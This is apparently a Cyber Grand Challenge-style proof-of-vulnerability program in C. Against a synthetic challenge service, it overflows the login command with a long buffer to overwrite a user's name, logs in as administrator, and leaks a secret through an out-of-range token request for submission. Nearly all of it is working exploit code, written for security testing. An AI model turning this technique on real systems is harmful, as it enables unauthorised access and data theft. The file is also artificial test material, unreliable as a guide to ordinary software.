#include <libpov.h>

int main()
{
    unsigned char exploit[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0c\"8N";
    char admin_name[] = {12, 34, 56, 78 };
    type2_vals t2;
    type2_negotiate(&t2);
    int secret = 0;

    unsigned char buf[200];
    unsigned short msg_length = 0;
    unsigned short register_user_req = 11382;
    char user_name[] = { 11, 22, 33, 44 };

    //Register first user (this user will have name overwritten)
    transmit_all(STDOUT, &register_user_req, sizeof(register_user_req));
    msg_length = sizeof(user_name);
    transmit_all(STDOUT, &msg_length, sizeof(msg_length));
    transmit_all(STDOUT, user_name, sizeof(user_name));

    //Logout user
    unsigned short logout_req = 8719;
    transmit_all(STDOUT, &logout_req, sizeof(logout_req));

    unsigned short login_req = 8711;
    //Using the login (vulnerable) command overwrite user name of first user
    transmit_all(STDOUT, &login_req, sizeof(login_req));
    msg_length = sizeof(exploit) - 1;
    transmit_all(STDOUT, &msg_length, sizeof(msg_length));
    transmit_all(STDOUT, exploit, sizeof(exploit) - 1);
    msg_length = sizeof(admin_name);
    transmit_all(STDOUT, &msg_length, sizeof(msg_length));
    transmit_all(STDOUT, admin_name, sizeof(admin_name));

    //Now login as the administrator
    transmit_all(STDOUT, &login_req, sizeof(login_req));
    msg_length = sizeof(admin_name);
    transmit_all(STDOUT, &msg_length, sizeof(msg_length));
    transmit_all(STDOUT, admin_name, sizeof(admin_name));
    msg_length = sizeof(admin_name);
    transmit_all(STDOUT, &msg_length, sizeof(msg_length));
    transmit_all(STDOUT, admin_name, sizeof(admin_name));

    unsigned short remote_token_req = 7777;
    unsigned short page_idx = 100;
    transmit_all(STDOUT, &remote_token_req, sizeof(remote_token_req));
    transmit_all(STDOUT, &page_idx, sizeof(page_idx));

    unsigned short exit_server = 9999;
    transmit_all(STDOUT, &exit_server, sizeof(exit_server));
    length_read(STDIN, buf, 24);
    length_read(STDIN, (unsigned char *)(&secret), sizeof(secret));
    type2_submit((unsigned char *)(&secret), sizeof(secret));
    return 0;
}
